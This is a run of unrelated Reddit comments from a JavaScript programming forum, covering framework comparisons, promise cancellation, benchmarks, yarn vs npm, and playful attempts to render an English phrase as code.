To provide a sincere answer; They perform the same end goal but with different paradigms. I have found vue to be more OOP and thin apps, React is more *mutate and live change* for scalability.
So my single page app with data collection form and quiz is perfect for Vue. Less than 200users. 
* [Lee Byron - Immutable User Interfaces](https://vimeo.com/166790294) * [Cheng Lou - On the Spectrum of Abstraction](https://www.youtube.com/watch?v=mVVNJKv9esE) 
If you like component architecture and know Angular 1.x, you should check out Angular2: https://angular.io/
Much grass. This is gonna be quite a rabbit hole. It does not look like Vue and bootstrap play well, bummer. 
I found a nice article talking about it https://blog.risingstack.com/node-hero-node-js-project-structure-tutorial/
Brian Lonsdorf - Oh Composable World! https://www.youtube.com/watch?v=SfWR3dKnFIo&amp;t=971s Terrific talk. And you can go deeper with his book (https://github.com/MostlyAdequate/mostly-adequate-guide) and his video series at egghead.io
I thought jQuery was considered dead tech. Hence why I am interested in Vue. Though I do love the selectors in jQuery. Zepto looks good, but I won't be learning anything nee if I used it. 
Again, you can use constants for this (similar to defining Redux actions which also depend on strings) Just to be clear, I'm not saying that inline event handlers do not have any advatages, it is a trade-off. But if you want to use reative programming, and write you apps in a [declarative manner](https://medium.freecodecamp.com/imperative-vs-declarative-programming-283e96bf8aea#.py5l5or52), than I don't see any other way but separating this two parts of the component. As stated, Recycle is a functional-reactive framework, but if FRP is not your thing, than yes, I guess classical inline defining of callbacks is still a way to go.
Tasks are wicked cool! The one downside of thunks is that they are a bit hard/extra work to compose (not that this isn't a good pattern, it is: it's basically exactly what a FP utility library's composeP function would be!). But Tasks have the virtue of retaining most of the utility of Promises, but statelessly and lazily out of the box, so that separating the description of the computation from the execution of the async side-effect and it's eventual effect is straightforward and easy: you map or chain. There are even sensible implementations to be had for concat, .ap, cancelation (which Promises are garbage at handling: the things they're having to do to the entire language just to support cancelation on Promise-returning APIs are just sad), etc. Of course, I've gotten so accustomed to Tasks now that I've even dabbled with using an IO type for non-async side-effects (which is a tiny bit crazy/overmuch in javascript, but I just love the paradigm).
Is it just me or is the title very clickbaity?
I'd try and avoid using JS Fiddle for these benchmarks – the website has a high memory usage which prevents proper benchmarking in many cases due to inline memory caches and the site's polyfills having an effect on some ES6 code. On a side note, here's a comparison between various different approaches to object creation and property access. https://esbench.com/bench/57bc8aa8db965b9a00965c42 
Looks like you've missed Angular 1.5's [component](https://docs.angularjs.org/guide/component). Also, do check out [Angular 2](https://angular.io/), because most of your concerns with Angular 1 are addressed in Angular 2. 
imo, consider the approach of using .then(res,rej) instead of catch: some consider that an "anti-pattern" for Promises, but imo, it's not if you're trying to shim Promises into a FP context. If something in res throws an error, you _may_ want it to have it throw in the Task constructor instead of throwing things into the rej callback. But you also may not. Tasks allow you to specify this logic in the constructor in whatever way that makes sense (and fits with what you're prepared to handle). But if you .then().catch() then you hand that control back over to the Promise-y way. The fact that Promises mix unexpected errors (where unhandled, bad code blows up) with _expected_ unwanted results is a real downside imo. 
I'm glad react has made your life easier, but I remain unconvinced. React either needs a JSX compiler or you need to learn their `createClass` API. That alone is enough of a hurdle to get over if you've never done either before, whereas Angular 1 is just pure javascript with some Angular danglies on it. React requires you to also learn their component APIs: what's state, what's props, componentWillMount, componentDidMount, componentShouldUpdate. Look at all that jargon. I've never felt more lost in the front end than trying to figure out which hooks I need to override. The article states that Angular's directive and component APIs are confusing and riddled with options but there's like 6 things I need to remember when creating one: the attached controller, the controller alias, what type it is (element, attribute, css class and/or a comment), the template, and bindings. Sometimes transclusion comes into play. If it's a directive, I should mark the scope's inheritance (but I don't because I'm a bad boy but also my frontend is scope soup right now). Angular will manage my dependencies for me. I just say I need a way to make promises and Angular provides it. With react, I need to figure that out on my own. The mess in that MVC illustration is because of poor developer discipline. Model, in MVC, is business logic, why is it talking directly to views? You should be able to take your model, drop it into a different app and not drag along all your views. React and Angular are solving two different problems. React wants to solve your rendering problems. Angular wants to solve your application problems. There's also the Functional Programming über alles in there as well. As if: 1. You can't do functional transforms on your data in Angular (which means almost all the frontend code I've written the last year is imaginary). 2. Objects are inherently sinful, yet ES6 React uses classes and inheritance! That's like a double sin right there. Finally, what's up with that hipster picture of a bunch of crap at the head of the article? It's not really fair for me to critique the article based on that but it certainly prepared me for what was inside. 
Only one thread is not insane for a server. It is only insane if you have blocking IO. Using nodes event loop is often faster than threading. 
1) Angular has more than 30 directives that you need to know and It's not about 6 options it's about different cases that get mixed up when you use different combinations of them. 2) I agree with the steps that you have mentioned but a React guy can also tell you some steps that will get you going 3) React does not provide you with Promise because it is not a framework it is a library and it is by design like that try using Promises provided in ES6 itself. 4) React is just a view layer but that is the whole point of it as it is not as opinionated as Angular you can use it as per the architecture of you application. 
those tests have a serious flaw. you have a `new` *factory*, which incurs significant overhead in that testcase. what you *should* be testing against is *inline* `new`. When you do this, the results align with my tests. `new + methods` significantly outperforms `literal factory + functions` in IE11, Edge, Firefox. In Chrome, `new` trails 10% and in Android Browser 4.4.4 it trails by 15%. In Chrome on Android, they're even. https://cdn.rawgit.com/leeoniya/a5bbc281b0fe6549c9605a4f54aea484/raw/f6e369ff19e05629e3612ee089454308e0f2564a/new-factory3.html However, if we put this in the context we both know (vdom), hyperscript as a template constructing api may benefit significantly from factory + literal, BUT this is assuming your vnodes have no api methods that rely on being bound to the vnode context. This is something I'll definitely look into (since no one wants to construct a template via inline `new`). The story is different for internals, `new` is almost always faster today (even if it's uglier/less functional). For Inferno apps which are usually compiled from jsx, vnode constructors remain internal, so all that exists for the typical use-case is the internals.
`playerStats.defense = 1` 
It's almost like they're two completely different things solving different problems and I even said that. I also rebutted the exact example you gave in the article but now you're moving goalposts and talking about built in directives.
NSFW Use this tool to view the NSFW Subreddit hierarchy and select multiple subreddits to view at once (instead of typing long URLs). I enjoy coding raw / pure JavaScript, so it was a bit of a challenge designing an interactive hierarchy tool from scratch. Please let me know your thoughts. [NSFW Subreddit Selector](http://www.SteelTitaniumCat.com) Here's a short expose on how it works: [How it works](http://www.SteelTitaniumCat.com/code.html)
thanks, I'll take a look at this
I disagree with what you said about the learning curve. Newcomers definitely have a harder time learning Angular. But I do agree that comparing Angular and React is a bit unfair because Angular is a framework which "solves your application problems" while React is a library that "solves your rendering problems". The reason we picked Angular at where I work is so we don't have to rip our hair out cherry picking libraries for every little functionality (rendering, data logic, routing, HTTP etc). That and learning another templating language are the reasons why we weren't convinced with React.
Don't use Flux/Redux unless you really need it - setState is not that bad, it's still better than Angular dirty checking. In both frameworks you get major benefits from setting up a one way data flow, doesn't mean you have to hammer everything in this way though.
 if(this.learningSomething){ today.isDecent = true; } 
Just wrap it in a conditional? if (!playerStats.defense) { playerStats.defense = 123; };
When putting this on the paper, would I include "Function in" at the beginning? This one-- to a non-programmer-- seems a bit more complex/confusing than the others. Haha Thank you!
 function isDayDecent(learnedSomething, self = {}) { self.figure('ok', learnedSomething); return learnedSomething; }
I've added a version that uses inline `new`: https://esbench.com/bench/57bc8aa8db965b9a00965c42 For me it performs almost the exact same as when `new` is within a function on Chrome due to inline caches.
Destructuring ranges from easy to kill me now.
Learn [Lodash](https://lodash.com/docs/4.17.2#defaults), it will make your life as a JS developer so much better. In your case, this would be all you need. _.defaults(playerStats, {defense:1}); 
&gt; on Chrome this leaves 50% of internet users unaccounted for :/ also, all of these benchmarks cause my laptop's CPU to thermal-throttle after the first test case. running them in sequence gives greatly skewed results between first and last tests. there needs to be a way to let the cpu recover between each test or pre-stress it to eliminate bias. this is why i fundamentally do not believe stress test benches that run serially. unfortunately, esbench doesnt allow me to re-run a single test manually. if you invert the order of these tests do the same results still hold for you?
Interesting project. What does this provide compared to just using cljs though?
thanks, I'll look into it. anyone helpful resources you know of for learning?
thanks, I'll keep this in mind
sorry, there was a typo in my post, the updated post should reflect my issue 
I think this is the best thing I've seen in relation to the traffic light. Good job!!
I was looking for some code of real applications using it, but I will see the links you posted, thanks for taking the time to provide them :).
Get to know the spread operator https://babeljs.io/docs/plugins/transform-object-rest-spread/
 if ( this.learningSomething ){ this.state = "OK"; today.isDecent = true; } The "state" part of this.state = "OK"; could be anything really. this.emotion, this.emotionalStatus or whatever sounds right. Replacing "this" with "self" is also pretty common if you prefer the sound of self.learningSomething etc. I think the concise version /u/timejazzfroghands proposed above is little nicer for its simplicity, even though it doesn't fully capture the entire phrase.
Here's how I'd do it while ( this.learningSomething() ) { this.ok = true; day.decent = true; }
It's so refreshing to see someone turn a pseudocode English statement into code that doesn't make a programmer cringe 
I see what you did, but the need to include divorce as an else kinda ruins it :P
What did you use to write an iPhone App in JS? I've wrote a little game with a JS library but it works clunky in mobile browsers, due to scrolling behavior - so I would like to run it in an native app. 
well yea, i won't know what version of the game a player might using so i need to use checks to prevent overwriting
It's never cringey when it's a gift from your SO ;)
What is your current skill level? 
There's learning curves for both. For me, the React learning curve was shallow and it took a while for it to click into place. Whereas Angular had a very steep learning curve, I learn it's magic words and I have a working app - no compiling needed. But for other folks, that could be switched. 
[There's Cordova.](https://cordova.apache.org/)
Have fun!
fixed it, I put that link up on my phone originally. My bad.
/u/EeveeInMyPocket this is your winner! 
hobbyist - amateur
To everyone: Thank you all so much! I am thrilled with the amount of responses and help I've received! I will go through each and take the suggestions! I think Thank you, thank you, thank you! :) while ( this.learningSomething() ) { this.ok = true; day.decent = true; } and while(this.am("learning something")) this.figure(this.am("ok")) &amp;&amp; today = new DecentDay(); are my top 2 picks! Thoughts? 
Look up object.assign, which object spread is sugar for, more or less.
First one fo sho. Exactly how I was going to suggest it!
 const OK = "It's a decent day"; function figure(day) { if(day.learnedSomething === true) { return OK; } } Also, in case you want to color it the way it might look in a code editor, it would look something like this: http://i.imgur.com/qK8YOC7.png
in Dockerfile would be better if first copy `package.json`with run `npm install` and later copy source files, thereby if you change source files and rebuild docker image, steps to `npm install` inclusive will be take from cache, so time of build will significantly decrease ;)
function mentalState(i) { return i.amLearning ? "Ok" : "Could be better."; } function dayQuality(learnedSomething) { return learnedSomething ? "Decent" : "Meh"; } dayQuality(mentalState(myself));
I also get the pluck error but it happens at the end, so didnt bother looking into why. The bench setup was pretty much copy/pasted from http://codepen.io/thotzl/pen/dXgGkG I also see the de-opt, but it's in a function that's a pretty insignificant part of the whole. Feel free to diagnose. I wonder if the differences we're seeing are due to different opcodes that JITs end up putting together on different OSs/CPUs. It's almost guaranteed that your CPU supports different ASM instructions than mine, has a larger/smaller cache, has different cache-miss &amp; branch prediction costs, other architecture diffs that only the JIT can know. I don't really see any other possible explanation here :/
The first one is more natural.
I dunno man default eslint settings would have something to say about the lack of space between the if token and the paren... 
If(today.learningSomething) { return 'OK'; }
Nope.
Make sure you get the formatting right also! You can use "code blocks" in the post editor to make them, click the button that looks like &lt;&gt;
Who needs to learn ++ when you can just += 1. 
Wow, that is very helpful. This will help a lot. Thank you. 
Well... I'd lose the surrounding spaces in the while condition.... :D
Could go for extra points with var self = this; while ( self.learningSomething() ) { self.ok = true;
Totally missed that, thank you!
this post can be summarized by a zero-length string: `""`
You claim one doesn't need to learn one part of a language because another, similar part of the language already exists. One should strive to learn all parts of a language. Especially the parts they don't like. Especially the sugar relating back to older parts of the language. Furthermore, mentioning prototype inheritance as a ES2015 feature to learn in an article about ES2015 features to learn would be wrong in at least three ways.
You need arrow functions in your life.
 today.isDecent = this.learningSomething()
Shallow attempt to be meta.
I had to repost, my phone was struggling with formatting. But yes, you would include the whole bit.
#1 definitely. #2 is a little off.
Maybe you can do something with one of [these] (https://www.google.com/search?site=&amp;tbm=isch&amp;source=hp&amp;biw=1920&amp;bih=974&amp;q=hunter+s+thompson&amp;oq=hunter+s+thompson&amp;gs_l=img.3..0l10.184.2767.0.2842.19.10.1.8.9.0.143.1011.3j7.10.0....0...1ac.1.64.img..0.19.1020...0i10i24k1.5WafIWAhiJc#tbm=isch&amp;q=hunter+s+thompson+fear+and+loathing&amp;imgrc=_) famous pictures of Hunter S. - and some kind of inside-joke from Javascript placed on there. There are places online that will take an image and print of a poster of it, if you have any photoshop skills (or maybe even paint skills) you might be able to whip something up.
Sizzle. That is the Library that I was thing to think of last night. Thanks for the help, you have helped shape my next project considerably! Gold is my small way if thanking you. 
I wish I could go to [JSConfEU](http://2017.jsconf.eu/), [Nordic.js](http://nordicjs.com/) and [JSConf.is](https://2016.jsconf.is/).
It's a style I picked up at my job (part of our style guide). I used to think it unnecessary, but I've grown quite fond of it.
Edit your post and use JSFiddle or Codepen to share your code here for syntax-highlighting and legibility.
"Put an arrow function on it!"
Self does little good here, the while loop does not introduce new block scope. Wrap that baby up in a closure!
if (batCountry === true) this.stop = false;
My main point was the feeling I got from reading the article was the author doesn't really understand these technologies very well or communicated his points poorly. Understanding prototypes is essential to properly understanding class syntax. It's more akin to using `++` or `+= 1` when you don't know how addition or references work yet. Also I never said prototypical inheritance are an ES2015 feature. They're such a core concept in JS and have been around since it was birthed. JS in general doesn't make an awful lot of sense without understanding it. You can learn JS class syntax as a way to learn about prototypes. I'm not advocating for learning older syntax in regards to building them. What I meant to say though I think I was unclear was telling people to learn classes in JS rather than learning its inheritance / prototypical model in general isn't very useful, again, akin learning how to increment before you understand what addition even is.
today.isDecent = !!learningSomething;
I've been able to avoid using Symbols (at least consciously) so far. 
Happy to help!
I'd do.... function* (me) { while (me.alive) { const day = yield; me.ok = day.learnedSomething; day.decent = me.ok; } } 
hardcore javascript even?
[removed]
react is not a framework
Can you get a sample of his code? I would like to see his preferred syntax to make sure he doesn't hate little things like the spaces surrounding the condition 
I'd recommend pixi.js for graphics and howler.js for audio. Depending on how you want to handle user input, you might look for an input library or just use the browser's keyboard and mouse/touch events.
Apart from Symbol.iterator, you mean? Symbols aren't that useful in everyday programming, but it's still important to understand that they exist and are used to hide properties from legacy iteration so you don't end up confused while debugging some day.
Excellent job! Very inspiring. So you just used all HTML elements? No canvas?
EmberConf 2016 - How to Build a Compiler by James Kyle . https://www.youtube.com/watch?v=Tar4WgAfMr4&amp;t=17s
What this references can change, and it's nice for the script to read better by aliasing this to self.
Not sure what you mean.
And now to export it as an npm module 
&gt; they don't care about things that will improve their careers That's being a bit melodramatic... &gt; or they have some bias against some people or sources. [...] I can't reasonably understand why someone wouldn't find that article useful You might have answered your own question; Elliott is a very opinionated and sometimes controversial figure, so that's not surprising. And it could be for lots of reasons: tired of Elliott, tired of types, tired of medium.com, title wasn't enticing, problem with the content itself (too long, inaccurate, whatever), it was posted at a poor time and/or date... any number of things. &gt; downvote is for things that are off-topic or not fit for the community In theory. I can't control nor influence voting habits, though. &gt; If you could help me out to understand why that was so downvoted it would be much-appreciated =/. [...] However, for highly opinionated discussions that have several point of views, I agree that reddit should go for like a bar where the community talks and everyone expose their point of views. If I had to take a guess, it's probably some combination of EE and TypeScript (and types in general) fatigue. Especially if you've been a part of the PHP community, as I was at one time, I'm not so sure that there's any original content left to be talked about in regards to dynamic type systems (it's been a topic in both communities for 5+ years). It can also be very contentious, and like you mention the bar atmosphere, sometimes people just want to go have a drink and make small talk, and don't want to get into politics or religion :) I agree though, the discussions are the most satisfying aspect of reddit.
The illustrations and jokes in this article are great
Not in that particular context. And aliasing is a little bit gross. Bind the function, or use a rocket ship. 
It sounds like you are just starting out, as your question doesn't really make sense. No offense. There are of course a ton of different programming languages, with Java, C and C++ being a couple of the heavy weights. However, JavaScript is literally the only programming language the browser understands (I'm discounting HTML and CSS as they're something different) There are no plans - that I'm aware of - to change this. On top of that, a few years ago somebody thought that it might be a good idea to use JavaScript on the backend as well. So we have Node.js that uses JavaScript to do basically anything that you would normally do in the backend. With the Node Eco system we also have NPM, which is a package manager, and build tools like Gulp or Grunt. All fundamentally using JavaScript or JSON. And then of course frameworks like Angular, Ember, Meteor and React. Again essentially JavaScript. So Javasript is really the hottest thing right now. And unless you specifically want to do main frame systems or native apps for iOS, you can't go wrong with learning JavaScript. 
Why would you say that?
&gt; In the above example, we are forced to add additional tag because we want to use one ngIf for both divs. You can use an ngIf for each div and it will be fine. Nobody is *forcing* anybody to do anything here. So I'm wondering: why do you feel it's so bad you need to add a layer of abstraction?
Because u are adding more "watchers".
Would it be nicer if 'day' had a 'status' property that can be set to 'decent', 'bad', 'shit' etc? Maybe the same for 'this' and 'ok'.
&gt; Angular, one has been around for years and is the real Angular, and the other is very different and shouldn't even be called Angular. They even expect &gt; you to use Typescript, so no, there isn't one Angular. It seems the new team wanted to ride the coat tails of Angular 1 to gain popularity. I'm not sure that plan is working for them, so now we're being told this BS. Python 2 has been around for years and is the real Python, and Python 3 is very different and shouldn't even be called Python. They even expect you to use UTF-8, so no, there isn't one Python. It seems the new team wanted to ride the coat tails of Python 2 to gain popularity. I'm not sure that plan is working for them, so now we're being told this BS.
There's always going to be more to learn, but you don't have to be close to mastering JavaScript to get paid to build stuff with it. You'd likely be getting a junior dev job and a senior dev would be checking your code and giving you advice. 
[A simple node sever with SSE.](https://github.com/hemanth/sse-now)
This made me think of the save-the-date for my wedding; my fiancee is also a developer. function wedding(bride, groom) { return bride.join(groom); } var bride = new Bride('First', 'Last'); var groom = new Groom('First', 'Last'); var ceremony = wedding(bride, groom); ceremony.export({ fields: ['date', 'time', 'location'] });
Thank you for your thoughtful and detailed feedback. I hate it when crappy code like mine ends up propagating and leading learners astray. **For the record: do not use any of this code in a production environment. It has bugs and hardcoded arbitrary constants, it uses experimental JavaScript features, and it's hard to read for someone not familiar with those features. In a real code review, this would fail pretty hard.** That said, I changed it slightly to be more idiomatic of modern JS development: import moment from 'moment'; const learnedSomething = () =&gt; Math.random() &lt;= .5; const alive = (d) =&gt; d.year() &lt;= 2090; // That's all you get const tomorrow = (m) =&gt; m.add(1, 'd'); const life = (function* (today) { while (alive(today)) yield { date: today = tomorrow(today), learnedSomething: learnedSomething() }; })(moment()); for (let day of life) { console.log(`${day.date.format('dddd, MMMM YYYY')} was ${day.learnedSomething ? 'a decent day' : 'ok'}`); } By adding a mere 20.7kB dependency, my script is now doing the date calculation properly, and is easier to read. I think this also demonstrates well how fun us programmers can be at parties sometimes.
Definitely D3.
nsfw? raw? why not hardcore? just a play on words!
this is why i don't do stand up 
We can deal with lack of support for experimental JavaScript features by adding babel and webpack!
Try using Slick: http://kenwheeler.github.io/slick/ You just configure it (follow the docs) and it will get you 95 % of the way. Then the last few % can be tweaked with CSS.
I agree on Highcharts.
What is the point of this post?
Super useful, thanks for sharing!
function a() { return "A"; } function b() { return "B"; } function f() { return [a, b]; } f(); // [a, b] f()[1] // b f()[1]() // b() -&gt; "B" console.log(f()[1]()); // will console log "B"
Hi /u/Angular2Fan, last warning. You should post from a variety of sources, and not just `netbasal.com` and `medium.com/@NetanelBasal`. domain submitted from|count|% :-|-:|-: [medium.com/@NetanelBasal](/search?q=%28and+site%3A%27medium.com%27+author%3A%27Angular2Fan%27+is_self%3A0+%29&amp;restrict_sr=off&amp;sort=new&amp;syntax=cloudsearch&amp;feature=legacy_search)|34|68% [netbasal.com](/search?q=%28and+site%3A%27netbasal.com%27+author%3A%27Angular2Fan%27+is_self%3A0+%29&amp;restrict_sr=off&amp;sort=new&amp;syntax=cloudsearch&amp;feature=legacy_search)|6|12%
Does he have an account with [GitHub](https://github.com/)? GitHub is a place where people store code. If not, you can always go with the [Airbnb JavaScript Style Guide](https://github.com/airbnb/javascript#whitespace). This guide is strongly considered the authority on JavaScript syntax. My recommendations to you would be: while (this.isLearningSomething()) { this.ok = true; day.decent = true; } Notice i added 'is' in front of learningSomething(). That is because learningSomething is returning a boolean value (true/false) and therefore it should start with either is or has (also in the style guide). If you want to get fancy you can try things like: while (this.isLearningSomething()) { this.ok = true; this.day.setMood('positive'); } Lastly, please send a picture of the finished product :)
*Jargon* (singular form)
METALz is bang on, but here's another possible approach to consider; it'll *replace* any existing handler: var downHandler; function setDownHandler(fn){ if(downHandler) canvas.removeEventListener("mousedown", downHandler); canvas.addEventListener(downHandler = fn); } setDownHandler(engage);
https://developers.google.com/chart/ is easier than d3, but less powerful.
You have to do it in the function. The issue is timing. Code outside the function runs before the data is available. Code in the function runs after. The whole purpose of requiring a function is because of that separation in timing, otherwise it could be omitted and your code would work as is
This is what async/await are for. I'd recommend using fetch instead of $.ajax, since fetch returns a promise and await works on promises.
my_data = await $.ajax("herp-derp", {method: "get"})
Angular 1.5 has components. :)
Guide to functional programming? Well I sure as hell would imagine so, have you tried typing "fp tutorial" into google?
What's preventing you from sending the data inside the function?
I'm confused, why don't you just move `res.send` into the body of the inner callback? data = data.response.employers res.send(data)
Also: playerStats.defense = playerStats.defense || 0 Immutability is preferred as others have suggested, but it's a pretty terse answer without opening that whole can of worms.
I think we'd need to see more of the context. This is an express app?
&gt; The reason we picked Angular at where I work is so we don't have to rip our hair out cherry picking libraries for every little functionality Picking the right lib for the job is probably my favorite part of implementing a new feature. I am so glad we're using react. &gt; learning another templating language JSX is just javascript with bits of html mixed in. There is no new templating language to learn for react.
funny
A bit confused about this. How does all the class extension, constructor, component / mount, etc. factor into the question here? Also, I don't believe your example will work, as the spread operator requires an iterable object, which your examples are not... There is a proposal for object spread operators (see: https://github.com/sebmarkbage/ecmascript-rest-spread) but if OP wants something they can use today, they should simply `return Object.assign({defense: 0}, playerStats)`
Lodash library seems overkill for just this, but certainly makes many useful utility methods available. Note also that `_.defaults(object, [sources])` _does_ mutate `object`. 
So if I `await` one of these promises then I have no way to handle it becoming cancelled?
Fuckin' A.
[removed]
You can do this with CSS body { counter-reset: section; } h1::before, h2::before, h3::before { counter-increment: section; content: counter(section) ". "; }
Right step_anim_start and end events are used to hide the high-res image. The class has an el property that holds the canvas so you would do this to add it to your page: import CanvasPlayer from './canvas-player' const player = new CanvasPlayer({ baseUrl: '../img/sequence' // Base url to images. }); // Add player to DOM container = document.querySelector('#canvas-container'); container.addChild(player.el);
Indeed, it will never resolve. I've added an alternative, Bluebird-inspired implementation with a `onCancel` handler, but that won't help with `await`. Edit2, we could tack a `cancelled` promise to the original one, then let prm = asyncOperation let result = await Promise.race(prm, prm.cancelled) with `prm.cancelled` that always resolves to a sentinel value denoting cancellation.
Maybe I am missing something but you aren't really canceling it, just replacing it with one that never resolves? If that is the case then what if something else relies on the promise? It can't tell if it is legit pending or not. Cancelled promises, I would assume though I haven't read the spec, would return some sort of cancelled value. 
There are plenty, but without getting all wrapped up into the hype around all the "pretty words" I suggest to anyone to first become familiar with the newer array prototype from MDN and using those practically: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/prototype Use the airbnb javascript eslinter rules as well as they help out a lot with doing things better with fewer side effects: https://github.com/airbnb/javascript Not saying you don't know all those things just pointing them out to anyone else coming in here. The main things with the newer array prototypes and the aribnb style is to _not_ use the for loop imperative style but the newer declarative and semantic styles of ".map()", ".filter()", ".reduce()", ".some()", ".every()". Also use ".concat()" and not ".push()" or ".pop()" or any mutative type of things, instead trying for new array references to come back. It makes large projects and code more maintainable and readable as well as less confusing about what is mutating what. 
https://egghead.io/courses/professor-frisby-introduces-composable-functional-javascript
I live to serve. 
So, having worked with React, Angular 2, and Vue, I would have to say I prefer them in this order: Vue ... React ............ Angular 2. I have moved fully over to Vue.js now and prefer it over both by a long shot. Most of what people have already mentioned here contributes to that, but a big deal for me that I haven't seen mentioned a whole lot is the integration with standard style pre-processors like Sass, LESS, and PostCSS. React has a very fragmented and convoluted (though many people praise the CSS-in-JS route) way of adding styles, and you can never count on what you'll get. In Vue, particularly in single-file components, it feels much more like you're writing a cohesive component with proper web technologies. It almost feels like what Web Components should be/should've been. The ability to have webpack integrate with every part of that, allowing you to change the template, style, or script language preprocessors, only helps improve it. The standardization on single-file components also aids distributing components reliably across the Vue ecosystem and makes the process considerably more painless than React. My current workflow is Vue with Flow and SCSS and a simple webpack config. I find the whole process wonderfully painless. It just fits with my way of thinking and throws way fewer curveballs than React or Angular 2. That said, choose what fits you, not what's hyped. When I first started with Vue almost no one seemed to know or care about it. Now I'm happy to see it making the "big three" list and I only wish for more success on the project.
r/domyjobforme
https://github.com/tc39/proposal-cancelable-promises/issues/70
&gt; profunctor optics heh heh true, PRs welcomed ;) 
yeah, it would be better we mention that.
So, can I use yarn to get the initial setup and then use npm from there?
Couldn't this be done right now with an external *is_cancelled* variable?
No… Have you read the proposal?
Anything that is "thenable" can be awaited. jQuery's $.ajax returns a thenable ergo it can be awaited just like fetch. wait = (ms) =&gt; ({ then: (resolve) =&gt; setTimeout(resolve, ms) }) (async () =&gt; { console.log('start') await wait(2000) console.log('done') }) 
Really enjoyed all the kind words that were said to domenic, and the way he gracefully exited the discussion 
The leading ; in the code examples is quite uncomfortable.
Is there anything in particular you would recommend I look at in that video? It's actually a bunch of videos from that channel that got me thinking about this haha. Also, I'm not a particularly experienced programmer myself when it comes to more low level things. Does the last paragraph of your reply address other aspects inherent in C style arrays? My experience so far is just wanting to figure out how to make JavaScript arrays behave more like a raise then maps for the purposes of basic data structures and algorithms, so I must admit that I'm a little bit lost in the last part of your reply.
Can you give a concrete example of what you'd like to do, and why it's potentially hard to do now? Are you trying to write a new "native JS array?" in language x (C, C++, Rust) and are wondering how to optimize them? Have you looked at servo's implementation of Array?
I want to practice implementing basic algorithms and data structures in JavaScript, and I want them to be performant if possible. With languages like C++ and Java I feel like I can "trust" an arraynto be an array if I use it in an implementation (such as a heap for a priority queue). With JavaScript arrays are internally backed by at least two different data structures. One is "c style" in that it allocates contiguous memory (thanks to engine optimizations) and runs very fast, and another is kind of a fallback that runs much slower. Until I figure out how to make sure any array I use behaves as the former (so far i only know of one thing, having holes/sparse array, that can make it be the slow version) I feel like I can't "trust" it. Also as someone who loves digging deep into things and wants to use JavaScript I feel like learning some of these details are great for my own learning. Hopefully that helps make sense of it. EDIT: i'm also very aware that some details are going to be engine implementation specific. But I feel like this particular issue is something that all modern engines what address similarly. I remember reading a blog about this exact thing making a huge difference in certain array operations in IE7, so I don't think it is something that would be unprofitable to look into. And for what it's worth, if I had to choose one engine, I would go with the eigh so I don't think it is something that would be unprofitable to look into. And for what it's worth, if I had to choose one engine, I would go with V8, since I like chrome and I use nodejs a lot (but like I said, I don't think that this is an issue in that way).
&gt; why do they need their funky symbols There's [an FAQ](https://github.com/tc39/proposal-private-fields/blob/master/FAQ.md) which is mostly about exactly that question.
i would do the opposite. the only advantage i see to using yarn is just for the `npm install --production` bit as its much faster than npm itself.
On slow connection it feels like blessing. Then again, `yarn`'s deviating behaviour from `npm` may cause troubles: https://github.com/yarnpkg/yarn/issues/2208
If you're working with numbers, typed arrays are guaranteed not to be sparse (they are not resizable either) and can only contain numbers of a specific type.
Q12016 migration from Parse.com to Postgre, never forgetti. 5 days of writing the migration, more than 15 hours in front of the computer on D-Day to manage to make it run properly without making Psql blow up. Never again Everything I said is not completely true, though. But there is so little usecase for NoSQL that I'd rather tell a dev **nope m8** rather than asking him why in the world does he want to use it and then having to explain him how much he's doing it wrong.
Actually planning to rewatch it in the next day or so, as prep for a blog post. Lemme get back to you then.
There's a "daddy issues" joke in here somewhere.
Good.
Actually, someone on Twitter suggested I could use Stylish, which I already use for darkening all white sites like GitHub/Google. [This](http://imgur.com/a/ST1Tz) is how I made a new Style, and it is applied automatically every time I visit the page.
https://github.com/hemanth/functional-programming-jargon#endomorphism Endomorphism "A function where the input type is the same as the output." should be "A **morphism** where the input type is the same as the output." Isomorphism "A pair of transformations between 2 types of objects that is structural in nature and no data is lost." should be "A pair of transformations between 2 types of objects that **are inverse to each other** and structural in nature, so that no data is lost." "No data is lost" does not mean the transformation are inverse to each other. But they have to be. 
I've found that rejecting with `null` is a good way to indicate an abort action. I've used this pattern a few times and it works really well. I've been meaning to write a blog post about the approach, but for now here's some code: // Make `fetch` "abortable". function abortableFetch(...args) { const deferred = {}; const promise = new Promise((resolve, reject) =&gt; { deferred.reject = reject; // Invoke the fetch argument with the matching args... only resolve if not // aborted. fetch(...args) .then(resp =&gt; !deferred.aborted &amp;&amp; resolve(resp)) .catch(ex =&gt; !deferred.aborted &amp;&amp; reject(ex)); }); promise.abort = function() { deferred.reject(null); deferred.aborted = true; return promise; }; return promise; } // Usage... const request = abortableFetch('/someUrl'); // If it takes longer than two seconds, abort... setTimeout(() =&gt; { request.abort(); }, 2000); // Wait for the abort to happen, if not `null` then it's an actual error. request.catch(ex =&gt; { if (ex !== null) { // Actual exception we should handle. } else { // Handle aborted, maybe retry here? } }); Note this doesn't do a true `abort` in the sense that the XHR is cancelled. Instead it ignores the response. Ideally `fetch` will eventually introduce some API `abort` *cough* that inherently calls `reject` with `null`. This `null` is what determines if the Promise was aborted/cancelled intentionally or if an error occurred. You could also generalize this to something like `Promise.makeCancellable`: https://gist.github.com/tbranyen/07d5ae9b4eefd060a70dccd3a52287ad 
I think my answer in a separate comment is close to what you're talking about as well. You create an intermediary promise and resolve/reject it based on an external boolean (aborted status). You then reject the promise with a value that can be checked on later (like a cancel token), I chose `null`.
With the approach I show above it would look like this: const p = abortableFetch(url) .then(r =&gt; r.json()) .then(data =&gt; fetch(data.otherUrl)) .then(r =&gt; r.text()) .then(text =&gt; updateUI(text)) .catch(err =&gt; { if (err !== null) { showUIError(); } else { stopSpinner(); } }); 
I was in particular referring to implementation of the "external `is_cancelled` variable". Wouldn't you need to check for that variable in each of the `.then()` parts and throw from it?
I'm using the implementation at https://github.com/facebook/react/issues/5465#issuecomment-157888325 and it's working quite well for not-deeply-nested Promises (note: I'm not saying it doesn't work for deeply nested ones, just that I've not tried it yet).
I was expecting this to be sarcasm but then I looked through the thread and it was actually quite cool to see people supporting and thanking him for his work. 
Agreed. Not a fan of this style. Seems more fashionable than useful 
Thanks again for the feedback. I will try to post more relevant content and try to push what I believe is really worth people learning. However, I can predict most of them won't be received very well...
It certainly can't garbage collect. 
So far so good. Makes things so much faster when installing deps during development and shaves a 2/3 of the time off the build in CI. 
Is it supposed to work on the linked website? Because if so it fails. 
The offline caching for ci/build servers is worth it. Been using it for a while now and I don't think I won't go back to npm 
